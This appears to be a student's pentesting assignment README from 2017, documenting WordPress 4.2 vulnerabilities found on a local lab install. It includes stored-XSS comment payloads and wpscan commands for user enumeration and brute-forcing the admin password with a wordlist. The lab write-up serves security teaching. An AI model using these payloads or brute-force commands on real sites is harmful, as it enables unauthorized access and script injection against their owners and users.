# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID
  - [x] Summary: exploited vulnerability to stored XSS through a comment
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.3
  - [x] GIF Walkthrough: https://imgur.com/a/xWQw0
  - [x] Steps to recreate: 
		1. go to wpdistillery.local;
		2. go to comment section of a post;
		3. comment: "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>"
  - [x] Affected source code: core wp
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Required) Vulnerability Name or ID
  - [x] Summary: exploited vulnerability to XSS through a comment
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.3
  - [x] GIF Walkthrough: https://imgur.com/a/BpbID
  - [x] Steps to recreate: 
		1. go to wpdistillery.local;
		2. go to comment section of a post;
		3. comment: <script>alert('XSS');</script>
  - [x] Affected source code: core wp
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Required) Vulnerability Name or ID
  - [x] Summary: exploited vunerability to enumeration through wpscan in kali linux terminal
    - Vulnerability types: user enumeration
    - Tested in version: 4.2
    - Fixed in version: 4.7
  - [x] GIF Walkthrough: https://imgur.com/a/EqxpY
  - [x] Steps to recreate: 
		1. open terminal;
		2. use command: wpscan --enumerate u --url wpdistillery.local;
		3. download text file rockyou-75.txt;
		4. use command: wpscan --url wpdistillery.local --wordlist '/root/rockyou-75.txt' --username admin

  - [x] Affected source code: core wp
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


## Assets

List any additional assets, such as scripts or files
rockyou-75.txt

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work
encountered substaintial difficulties installing the wordpress software
encountered difficulties when attempting to use wpdistillery.dev and needed to use wpdistillery.local
encountered difficulties when attempting to switch between versions and needed to completely reinstall the software

## License

    Copyright [2017] [Beck Galbraith]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
